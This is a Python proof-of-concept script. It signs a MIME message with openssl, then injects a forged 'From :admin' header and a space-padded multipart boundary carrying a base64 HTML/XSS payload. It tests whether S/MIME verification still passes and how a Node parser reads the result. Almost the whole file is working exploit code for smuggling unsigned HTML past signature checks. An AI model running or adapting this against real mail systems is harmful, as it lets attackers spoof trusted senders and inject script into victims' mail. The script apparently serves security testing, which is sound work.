import base64, subprocess, os, json
os.chdir('/tmp/ostest')
B1 = '===============0344718024407626035=='
PWN = '<img src=x onerror="alert(1)">'
b64 = base64.b64encode(PWN.encode()).decode()
payload = ('<!DOCTYPE html><html><body><h1>Re: '
           '\n--' + B1 + ' \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n'
           + b64 + '\n--' + B1 + '-- '
           '</h1></body></html>')
inner = ('Content-Type: multipart/mixed; boundary="' + B1 + '"\n'
         'MIME-Version: 1.0\n\n'
         '--' + B1 + '\nContent-Type: text/plain; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
         + payload + '\n'
         '--' + B1 + '\nContent-Type: text/html; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
         + payload + '\n'
         '--' + B1 + '--\n')
open('inner2.txt', 'w').write(inner)
subprocess.run(['openssl', 'cms', '-sign', '-in', 'inner2.txt', '-signer', 'cert.pem', '-inkey', 'key.pem',
                '-outform', 'SMIME', '-out', 'signed2.eml', '-md', 'sha256'], check=True)
raw = open('signed2.eml').read()
inj = ('From :admin@ses\n'
       '--' + B1 + ' \n'
       'Content-Type : text/html\n'
       'Content-Transfer-Encoding : base64\n'
       '\n'
       + b64 + '\n'
       '--' + B1 + '-- \n')
head, rest = raw.split('\n\n', 1)
variant = head + '\n' + inj + '\n' + rest
open('variant2.eml', 'w').write(variant)
r = subprocess.run(['openssl', 'cms', '-verify', '-in', 'variant2.eml', '-CAfile', 'cert.pem', '-out', 'out3.txt'],
                   capture_output=True, text=True)
print('verify rc', r.returncode, 'err', r.stderr.strip()[:200])
if os.path.exists('out3.txt'):
    open('./_z_496_emls/out3.eml', 'w').write(open('out3.txt').read())
    print('out3 head:', open('out3.txt').read()[:400])
    p = subprocess.run(['node', './_z_496_parse.js', './_z_496_emls/out3.eml'],
                       capture_output=True, text=True)
    print('PARSE of verified content:')
    print(p.stdout[:800])
